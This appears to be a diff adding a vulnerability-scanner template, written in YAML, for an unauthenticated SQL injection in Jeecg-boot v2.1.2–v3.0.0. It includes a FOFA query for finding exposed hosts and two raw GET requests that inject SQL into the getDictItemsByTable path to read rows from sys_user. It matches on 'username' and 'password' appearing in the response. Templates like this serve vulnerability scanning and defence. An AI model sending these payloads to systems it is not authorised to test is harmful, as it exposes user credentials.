@@ -1,0 +1,28 @@
+id: jeecg-boot-getdictItemsbytable-sqli
+
+info:
+  name: Jeecg-boot v2.1.2-v3.0.0 后台未授权SQL注入漏洞
+  author: free2e
+  severity: high
+  description: |-
+    Jeecg-boot v2.1.2-v3.0.0 后台未授权SQL注入漏洞存在未授权注入漏洞，可以未授权构造sql语句，获取信息。
+    fofa-query: title=="JeecgBoot 企业级低代码平台"
+  reference:
+    - https://xz.aliyun.com/t/13186?time_311=mqmxnDBDcD2A0%3DGODlxGORzQb%3Dqj2YS20iD&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F
+  tags: Jeecg-Boot
+
+http:
+  - raw:
+      - |
+        GET /jeecg-boot//sys/ng-alain/getDictItemsByTable/'%20from%20sys_user%20limit%201,2/*,%20'/x.js HTTP/1.1
+        Host: {{Hostname}}
+      
+      - |
+        GET //sys/ng-alain/getDictItemsByTable/'%20from%20sys_user%20limit%201,2/*,%20'/x.js HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200 && contains(body,"username") && contains(body,"password")
